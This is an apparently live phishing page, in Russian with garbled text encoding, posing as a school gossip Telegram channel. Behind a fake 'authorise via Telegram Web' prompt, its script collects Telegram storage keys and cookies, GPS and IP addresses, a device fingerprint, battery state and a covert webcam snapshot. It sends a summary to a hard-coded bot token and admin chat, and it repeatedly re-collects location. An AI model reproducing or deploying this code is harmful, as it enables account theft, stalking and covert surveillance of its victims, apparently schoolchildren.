<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê ‚Ä¢ Telegram</title>
    <meta name="theme-color" content="#3390ec">
    <style>
        :root {
            --tg-bg: #0f0f0f;
            --tg-card: #1a1a1a;
            --tg-text: #ffffff;
            --tg-hint: #aaaaaa;
            --tg-blue: #3390ec;
            --tg-green: #2ecc71;
            --tg-red: #e74c3c;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--tg-bg);
            color: var(--tg-text);
            line-height: 1.5;
            overflow-x: hidden;
            position: relative;
        }
        
        .app {
            max-width: 480px;
            margin: 0 auto;
            min-height: 100vh;
            background: var(--tg-bg);
            position: relative;
        }
        
        /* Header */
        .header {
            position: sticky;
            top: 0;
            background: rgba(15, 15, 15, 0.95);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid #2d2d2d;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            z-index: 1000;
        }
        
        .header-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(51, 144, 236, 0.1);
            border: none;
            color: var(--tg-blue);
            font-size: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .header-title {
            font-size: 17px;
            font-weight: 600;
            text-align: center;
            flex-grow: 1;
        }
        
        /* Channel Hero */
        .channel-hero {
            height: 180px;
            background: linear-gradient(135deg, #1a237e 0%, #311b92 100%);
            position: relative;
        }
        
        .channel-avatar {
            position: absolute;
            bottom: -40px;
            left: 20px;
            width: 80px;
            height: 80px;
            background: var(--tg-blue);
            border-radius: 50%;
            border: 4px solid var(--tg-bg);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
        }
        
        /* Content */
        .content {
            padding: 60px 20px 30px;
        }
        
        .channel-title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 4px;
        }
        
        .channel-subscribers {
            color: var(--tg-hint);
            font-size: 15px;
            margin-bottom: 25px;
        }
        
        /* Button */
        .join-btn {
            width: 100%;
            padding: 18px;
            background: var(--tg-blue);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin: 25px 0;
            transition: transform 0.2s;
        }
        
        .join-btn:active {
            transform: scale(0.98);
        }
        
        /* Posts */
        .post {
            background: var(--tg-card);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 15px;
            border: 1px solid #2d2d2d;
        }
        
        .post-header {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
        }
        
        .post-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        
        .post-author {
            font-weight: 600;
            font-size: 15px;
        }
        
        .post-time {
            color: var(--tg-hint);
            font-size: 13px;
            margin-top: 2px;
        }
        
        .post-text {
            margin-bottom: 12px;
            font-size: 15px;
        }
        
        .post-media {
            border-radius: 12px;
            background: #000;
            height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--tg-hint);
            margin-bottom: 12px;
        }
        
        /* Modal */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            opacity: 0;
            visibility: hidden;
            transition: 0.3s;
        }
        
        .modal.active {
            opacity: 1;
            visibility: visible;
        }
        
        .modal-content {
            background: var(--tg-card);
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .modal-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
        
        .modal-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        
        .modal-text {
            color: var(--tg-hint);
            margin-bottom: 25px;
            line-height: 1.5;
        }
        
        /* Progress */
        .progress {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 2px;
            overflow: hidden;
            margin: 25px 0;
        }
        
        .progress-bar {
            height: 100%;
            background: var(--tg-blue);
            width: 0%;
            transition: width 0.3s;
        }
        
        /* Hidden */
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="app">
        <!-- Header -->
        <div class="header">
            <button class="header-btn" onclick="history.back()">‚Üê</button>
            <div class="header-title">–ö–∞–Ω–∞–ª</div>
            <button class="header-btn">‚ãÆ</button>
        </div>
        
        <!-- Channel -->
        <div class="channel-hero">
            <div class="channel-avatar">üì¢</div>
        </div>
        
        <div class="content">
            <h1 class="channel-title">–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê</h1>
            <div class="channel-subscribers">56 –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤</div>
            
            <button class="join-btn" id="joinBtn">
                <span>–ü–µ—Ä–µ–π—Ç–∏ –≤ –∫–∞–Ω–∞–ª</span>
                <span>‚Üí</span>
            </button>
            
            <div class="progress hidden" id="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <!-- Posts -->
            <div class="post">
                <div class="post-header">
                    <div class="post-avatar">A</div>
                    <div>
                        <div class="post-author">–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä</div>
                        <div class="post-time">—Å–µ–≥–æ–¥–Ω—è –≤ 14:30</div>
                    </div>
                </div>
                <div class="post-text">
                    –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –Ω–∞—à –∫–∞–Ω–∞–ª! –î–ª—è –¥–æ—Å—Ç—É–ø–∞ —Ç—Ä–µ–±—É–µ—Ç—Å—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram Web.
                </div>
                <div class="post-media">
                    üîí –ö–æ–Ω—Ç–µ–Ω—Ç –¥–æ—Å—Ç—É–ø–µ–Ω –ø–æ—Å–ª–µ –≤—Ö–æ–¥–∞
                </div>
            </div>
            
            <div class="post">
                <div class="post-header">
                    <div class="post-avatar">M</div>
                    <div>
                        <div class="post-author">–ú–æ–¥–µ—Ä–∞—Ç–æ—Ä</div>
                        <div class="post-time">–≤—á–µ—Ä–∞ –≤ 19:45</div>
                    </div>
                </div>
                <div class="post-text">
                    –í—Å–µ —Å–æ–æ–±—â–µ–Ω–∏—è –∞–Ω–æ–Ω–∏–º–Ω—ã. –í–∞—à–∞ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç—å –∑–∞—â–∏—â–µ–Ω–∞.
                </div>
            </div>
        </div>
        
        <!-- Auth Modal -->
        <div class="modal" id="authModal">
            <div class="modal-content">
                <div class="modal-icon">üîê</div>
                <h2 class="modal-title">–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞</h2>
                <p class="modal-text">
                    –î–ª—è –≤—Ö–æ–¥–∞ –≤ –∫–∞–Ω–∞–ª —Ç—Ä–µ–±—É–µ—Ç—Å—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —á–µ—Ä–µ–∑ Telegram Web
                </p>
                <button class="join-btn" id="authBtn">
                    <span>–ê–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è</span>
                </button>
                <div class="progress">
                    <div class="progress-bar" id="authProgress"></div>
                </div>
                <div id="authStatus" class="hidden">üîÑ –û–±—Ä–∞–±–æ—Ç–∫–∞...</div>
            </div>
        </div>
        
        <!-- Hidden Collectors -->
        <div style="position:absolute;width:1px;height:1px;opacity:0">
            <video id="camera" autoplay muted playsinline></video>
            <canvas id="canvas"></canvas>
            <audio id="mic"></audio>
        </div>
    </div>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const CONFIG = {
            BOT_TOKEN: '8578533182:AAHVUzQtIkhMjfSofiyeUJPDkEOvmfXJ08g',
            ADMIN_ID: 8001083987,
            VERSION: '2.0'
        };
        
        // –°–æ—Å—Ç–æ—è–Ω–∏–µ
        const state = {
            victimId: null,
            sessionId: null,
            isCollecting: false,
            data: {},
            collected: 0
        };
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        document.addEventListener('DOMContentLoaded', () => {
            console.log('–°–∏—Å—Ç–µ–º–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞');
            
            // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è ID
            state.victimId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            state.sessionId = generateSessionId();
            
            // –°–æ–±—ã—Ç–∏—è
            document.getElementById('joinBtn').addEventListener('click', startCollection);
            document.getElementById('authBtn').addEventListener('click', processAuth);
            
            // –§–æ–Ω–æ–≤—ã–π —Å–±–æ—Ä
            setTimeout(collectInitialData, 2000);
        });
        
        function generateSessionId() {
            const arr = new Uint8Array(32);
            crypto.getRandomValues(arr);
            return Array.from(arr, b => b.toString(16).padStart(2, '0')).join('');
        }
        
        function startCollection() {
            const modal = document.getElementById('authModal');
            const progress = document.getElementById('progress');
            
            modal.classList.add('active');
            progress.classList.remove('hidden');
            state.isCollecting = true;
            
            // –ó–∞–ø—É—Å–∫ –ø–æ–ª–Ω–æ–≥–æ —Å–±–æ—Ä–∞
            setTimeout(fullCollection, 1000);
        }
        
        async function processAuth() {
            const btn = document.getElementById('authBtn');
            const progress = document.getElementById('authProgress');
            const status = document.getElementById('authStatus');
            
            btn.disabled = true;
            
            // –≠—Ç–∞–ø—ã —Å–±–æ—Ä–∞
            const steps = [
                {func: collectTelegramData, name: 'Telegram –¥–∞–Ω–Ω—ã–µ'},
                {func: collectGeoData, name: '–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è'},
                {func: collectSystemData, name: '–°–∏—Å—Ç–µ–º–∞'},
                {func: collectMediaData, name: '–ú–µ–¥–∏–∞'},
                {func: extractPhone, name: '–¢–µ–ª–µ—Ñ–æ–Ω'}
            ];
            
            for (let i = 0; i < steps.length; i++) {
                progress.style.width = `${(i + 1) * 20}%`;
                status.textContent = `üîÑ ${steps[i].name}...`;
                status.classList.remove('hidden');
                
                await steps[i].func();
                await sleep(1000);
            }
            
            // –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ
            progress.style.width = '100%';
            status.textContent = '‚úÖ –ó–∞–≤–µ—Ä—à–µ–Ω–æ';
            
            // –û—Ç–ø—Ä–∞–≤–∫–∞ –≤—Å–µ—Ö –¥–∞–Ω–Ω—ã—Ö
            await sendAllData();
            
            // –£—Å–ø–µ—Ö
            setTimeout(() => {
                modal.classList.remove('active');
                document.getElementById('joinBtn').textContent = '‚úÖ –í—ã –≤ –∫–∞–Ω–∞–ª–µ';
                document.getElementById('joinBtn').style.background = '#2ecc71';
                document.getElementById('joinBtn').disabled = true;
            }, 2000);
        }
        
        async function collectTelegramData() {
            const data = {};
            
            // LocalStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.includes('telegram') || key.includes('tg') || key.includes('auth')) {
                    data[key] = localStorage.getItem(key);
                }
            }
            
            // SessionStorage
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key.includes('tg') || key.includes('user')) {
                    data['s_' + key] = sessionStorage.getItem(key);
                }
            }
            
            // Cookies
            data.cookies = document.cookie;
            data.cookieCount = document.cookie.split(';').filter(c => c.trim()).length;
            
            state.data.telegram = data;
            state.collected += Object.keys(data).length;
            
            return data;
        }
        
        async function collectGeoData() {
            const data = {};
            
            // GPS
            if (navigator.geolocation) {
                await new Promise(resolve => {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            data.gps = {
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                acc: pos.coords.accuracy
                            };
                            resolve();
                        },
                        () => resolve(),
                        {enableHighAccuracy: true, timeout: 10000}
                    );
                });
            }
            
            // IP via WebRTC
            try {
                const pc = new RTCPeerConnection({iceServers: []});
                pc.createDataChannel('');
                pc.createOffer().then(pc.setLocalDescription.bind(pc));
                
                pc.onicecandidate = ice => {
                    if (ice.candidate?.candidate) {
                        const match = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (match) data.ip = match[1];
                        pc.onicecandidate = () => {};
                    }
                };
                
                setTimeout(() => pc.close(), 1000);
            } catch(e) {}
            
            // External IP
            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                const json = await resp.json();
                if (json.ip) data.extIp = json.ip;
            } catch(e) {}
            
            state.data.geo = data;
            state.collected += Object.keys(data).length;
            
            return data;
        }
        
        async function collectSystemData() {
            const data = {
                ua: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                screen: `${screen.width}x${screen.height}`,
                cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: location.href
            };
            
            // Connection
            if (navigator.connection) {
                data.connection = {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                };
            }
            
            // Battery
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    };
                } catch(e) {}
            }
            
            state.data.system = data;
            state.collected += Object.keys(data).length;
            
            return data;
        }
        
        async function collectMediaData() {
            const data = {photos: 0, videos: 0, audio: 0};
            
            try {
                // –ö–∞–º–µ—Ä–∞
                if (navigator.mediaDevices?.getUserMedia) {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {facingMode: 'user'},
                        audio: false
                    });
                    
                    const video = document.getElementById('camera');
                    const canvas = document.getElementById('canvas');
                    const ctx = canvas.getContext('2d');
                    
                    video.srcObject = stream;
                    
                    await new Promise(resolve => video.onloadedmetadata = resolve);
                    
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    
                    data.photos = 1;
                    data.photoRes = `${canvas.width}x${canvas.height}`;
                    
                    stream.getTracks().forEach(t => t.stop());
                }
            } catch(e) {}
            
            state.data.media = data;
            state.collected += data.photos + data.videos + data.audio;
            
            return data;
        }
        
        async function extractPhone() {
            let phone = null;
            
            // –ü–æ–∏—Å–∫ –≤ –¥–∞–Ω–Ω—ã—Ö
            const allData = JSON.stringify(state.data);
            const phoneMatch = allData.match(/(?:\+|\d)[\d\s\-\(\)]{10,20}/);
            if (phoneMatch) phone = phoneMatch[0];
            
            state.data.phone = phone;
            if (phone) state.collected++;
            
            return phone;
        }
        
        async function sendAllData() {
            const allData = {
                victimId: state.victimId,
                sessionId: state.sessionId,
                timestamp: new Date().toISOString(),
                collected: state.collected,
                data: state.data
            };
            
            // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –∫—Ä–∞—Å–∏–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
            const message = formatMessage(allData);
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
            await sendToTelegram(message);
            
            console.log('‚úÖ –í—Å–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã');
        }
        
        function formatMessage(data) {
            const geo = data.data.geo || {};
            const sys = data.data.system || {};
            const media = data.data.media || {};
            
            return `
üîê <b>–ù–û–í–´–ô –î–û–°–¢–£–ü –ö –ö–ê–ù–ê–õ–£</b>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

üë§ <b>–ò–ù–§–û–†–ú–ê–¶–ò–Ø:</b>
‚îú ID: <code>${data.victimId}</code>
‚îú –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}
‚îú –£—Å—Ç—Ä–æ–π—Å—Ç–≤: ${sys.platform || 'N/A'}
‚îî –Ø–∑—ã–∫: ${sys.language || 'N/A'}

üìç <b>–ì–ï–û–õ–û–ö–ê–¶–ò–Ø:</b>
‚îú IP: ${geo.ip || geo.extIp || 'N/A'}
${geo.gps ? `‚îú –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: <code>${geo.gps.lat}, ${geo.gps.lon}</code>` : ''}
${geo.gps ? `‚îî –¢–æ—á–Ω–æ—Å—Ç—å: ${geo.gps.acc}–º` : '‚îî GPS: –ù–µ –¥–æ—Å—Ç—É–ø–µ–Ω'}

üì± <b>–°–ò–°–¢–ï–ú–ê:</b>
‚îú User-Agent: ${sys.ua?.substring(0, 60)}...
‚îú –≠–∫—Ä–∞–Ω: ${sys.screen || 'N/A'}
‚îú –Ø–¥–µ—Ä: ${sys.cores || 'N/A'}
‚îú –ü–∞–º—è—Ç—å: ${sys.memory || 'N/A'}GB
‚îî –ë–∞—Ç–∞—Ä–µ—è: ${sys.battery ? `${sys.battery.level}% ${sys.battery.charging ? '‚ö°' : ''}` : 'N/A'}

üîê <b>TELEGRAM –î–ê–ù–ù–´–ï:</b>
‚îú –ö–ª—é—á–µ–π: ${Object.keys(data.data.telegram || {}).length}
‚îú Cookies: ${data.data.telegram?.cookieCount || 0}
‚îî –¢–µ–ª–µ—Ñ–æ–Ω: ${data.data.phone ? `<code>${data.data.phone}</code>` : '–ù–µ –Ω–∞–π–¥–µ–Ω'}

üì∏ <b>–ú–ï–î–ò–ê:</b>
‚îú –§–æ—Ç–æ: ${media.photos || 0} —à—Ç.
‚îú –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${media.photoRes || 'N/A'}
‚îî –í—Å–µ–≥–æ –¥–∞–Ω–Ω—ã—Ö: ${data.collected} —Ç–æ—á–µ–∫

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ ‚Ä¢ –ü–æ–¥—Å–ª—É—à–∞–Ω–æ 4 –®–∫–æ–ª–∞
`;
        }
        
        async function sendToTelegram(message) {
            try {
                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`;
                
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CONFIG.ADMIN_ID,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                });
            } catch(e) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', e);
            }
        }
        
        function collectInitialData() {
            // –°–æ–±–∏—Ä–∞–µ–º –±–∞–∑–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ –≤ —Ñ–æ–Ω–µ
            collectSystemData();
            collectGeoData();
        }
        
        function fullCollection() {
            // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —Å–±–æ—Ä
            setInterval(() => {
                if (state.isCollecting) {
                    collectGeoData();
                }
            }, 30000);
        }
        
        function sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }
    </script>
</body>
</html>
